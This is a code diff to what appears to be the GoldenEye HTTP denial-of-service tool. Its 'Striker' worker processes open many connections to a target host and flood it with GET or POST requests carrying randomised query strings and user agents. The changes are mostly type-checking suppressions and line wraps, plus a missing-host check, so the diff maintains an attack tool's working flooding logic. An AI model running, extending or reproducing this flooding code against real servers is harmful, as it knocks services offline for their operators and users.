@@ -172,7 +172,7 @@ class GoldenEye(object):
                 worker.useragents = self.useragents
                 worker.method = self.method
 
-                self.workersQueue.append(worker)
+                self.workersQueue.append(worker)  # type: ignore
                 worker.start()
             except Exception:
                 error(f"Failed to start worker {i}")
@@ -204,8 +204,8 @@ class GoldenEye(object):
         while len(self.workersQueue) > 0:
             try:
                 for worker in self.workersQueue:
-                    if worker is not None and worker.is_alive():
-                        worker.join(JOIN_TIMEOUT)
+                    if worker is not None and worker.is_alive():  # type: ignore
+                        worker.join(JOIN_TIMEOUT)  # type: ignore
                     else:
                         self.workersQueue.remove(worker)
 
@@ -216,9 +216,10 @@ class GoldenEye(object):
                 for worker in self.workersQueue:
                     try:
                         if DEBUG:
-                            print(f"Killing worker {worker.name}")
+                            print(f"Killing worker"
+                                  f"{worker.name}")  # type: ignore
                         # worker.terminate()
-                        worker.stop()
+                        worker.stop()  # type: ignore
                     except Exception:
                         pass  # silently ignore
                 if DEBUG:
@@ -311,6 +312,9 @@ class Striker(Process):
 
                 for _ in range(self.nr_socks):
 
+                    if self.host is None:
+                        raise ValueError("Host is not set")
+
                     if self.ssl:
                         if SSLVERIFY:
                             c = HTTPCLIENT.HTTPSConnection(
@@ -321,7 +325,7 @@ class Striker(Process):
                     else:
                         c = HTTPCLIENT.HTTPConnection(self.host, self.port)
 
-                    self.socks.append(c)
+                    self.socks.append(c)  # type: ignore
 
                 for conn_req in self.socks:
 
@@ -330,11 +334,12 @@ class Striker(Process):
                     method = random.choice(
                         [METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
 
-                    conn_req.request(method.upper(), url, None, headers)
+                    conn_req.request(method.upper(), url, None,  # type: ignore
+                                     headers)
 
                 for conn_resp in self.socks:
 
-                    _ = conn_resp.getresponse()
+                    _ = conn_resp.getresponse()  # type: ignore
                     self.incCounter()
 
                 self.closeConnections()
@@ -350,7 +355,7 @@ class Striker(Process):
     def closeConnections(self):
         for conn in self.socks:
             try:
-                conn.close()
+                conn.close()  # type: ignore
             except Exception:
                 pass  # silently ignore
 
@@ -384,10 +389,10 @@ class Striker(Process):
 
         param_joiner = "?"
 
-        if len(self.url) == 0:
+        if len(self.url) == 0:  # type: ignore
             self.url = '/'
 
-        if self.url.count("?") > 0:
+        if self.url.count("?") > 0:  # type: ignore
             param_joiner = "&"
 
         request_url = self.generateRequestUrl(param_joiner)
@@ -398,7 +403,8 @@ class Striker(Process):
 
     def generateRequestUrl(self, param_joiner='?'):
 
-        return self.url + param_joiner + self.generateQueryString(random.randint(1, 5))
+        return (self.url + param_joiner  # type: ignore
+                + self.generateQueryString(random.randint(1, 5)))
 
     def getUserAgent(self):
 
@@ -523,13 +529,13 @@ class Striker(Process):
     # Counter Functions
     def incCounter(self):
         try:
-            self.counter[0] += 1
+            self.counter[0] += 1  # type: ignore
         except Exception:
             pass
 
     def incFailed(self):
         try:
-            self.counter[1] += 1
+            self.counter[1] += 1  # type: ignore
         except Exception:
             pass
 
